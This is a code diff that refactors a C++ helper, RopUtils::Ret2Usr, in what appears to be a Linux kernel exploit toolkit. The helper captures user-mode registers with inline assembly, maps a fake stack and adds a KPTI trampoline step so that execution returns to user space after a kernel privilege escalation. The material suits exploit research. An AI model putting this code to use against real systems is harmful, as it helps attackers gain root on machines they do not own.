@@ -2,39 +2,32 @@
 
 #include <sys/mman.h>
 #include <cstring>
-#include "payloads/RopChain.h"
+#include "payloads/RopChain.hpp"
+#include "rip/RopUtils.hpp"
 
-class RopUtils {
-public:
-    /**
-     * @brief Generates a ROP chain to return to user space after a kernel exploit.
-     *
-     * This function sets up a fake user stack and uses the KPTI trampoline to transition back to user space.
-     * @param rop The RopChain object to add the return-to-user ROP action to.
-     * @param after_lpe_func The address of the function to execute in user space after returning from the kernel.
-     * @param stack_size The size of the fake user stack to allocate (default is 0x8000).
-     * @param redzone_size The size of the redzone at the end of the fake user stack (default is 0x100).
-     */
-    static void Ret2Usr(RopChain& rop, void* after_lpe_func, size_t stack_size = 0x8000, size_t redzone_size = 0x100) {
-        uint64_t _user_cs = 0;
-        uint64_t _user_rflags = 0;
-        uint64_t _user_sp = 0;
-        uint64_t _user_ss = 0;
+void RopUtils::Ret2Usr(RopChain& rop, void* after_lpe_func, size_t stack_size,
+                       size_t redzone_size) {
+  uint64_t _user_cs = 0;
+  uint64_t _user_rflags = 0;
+  uint64_t _user_sp = 0;
+  uint64_t _user_ss = 0;
 
-        __asm__(".intel_syntax noprefix;"
-            "mov %0, cs;"
-            "mov %1, ss;"
-            "mov %2, rsp;"
-            "pushf;"
-            "pop %3;"
-            ".att_syntax"
-            : "=r"(_user_cs), "=r"(_user_ss), "=r"(_user_sp), "=r"(_user_rflags)
-        );
+  __asm__(
+      ".intel_syntax noprefix;"
+      "mov %0, cs;"
+      "mov %1, ss;"
+      "mov %2, rsp;"
+      "pushf;"
+      "pop %3;"
+      ".att_syntax"
+      : "=r"(_user_cs), "=r"(_user_ss), "=r"(_user_sp), "=r"(_user_rflags));
 
-        auto fake_stack = (uint64_t)mmap(NULL, stack_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-        auto stack_start = fake_stack + stack_size - redzone_size;
-        for (int i = 0; i < redzone_size - 7; i += 8)
-            *(uint64_t*)(stack_start + i) = 0xffffff4545454545; // use canonical address
-        rop.AddRopAction(RopActionId::KPTI_TRAMPOLINE, { (uint64_t)after_lpe_func, _user_cs, _user_rflags, stack_start, _user_ss });
-    }
-};
+  auto fake_stack = (uint64_t)mmap(NULL, stack_size, PROT_READ | PROT_WRITE,
+                                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+  auto stack_start = fake_stack + stack_size - redzone_size;
+  for (int i = 0; i < redzone_size - 7; i += 8)
+    *(uint64_t*)(stack_start + i) = 0xffffff4545454545;  // use canonical address
+  rop.AddRopAction(RopActionId::KPTI_TRAMPOLINE,
+                   {(uint64_t)after_lpe_func, _user_cs, _user_rflags,
+                    stack_start, _user_ss});
+}
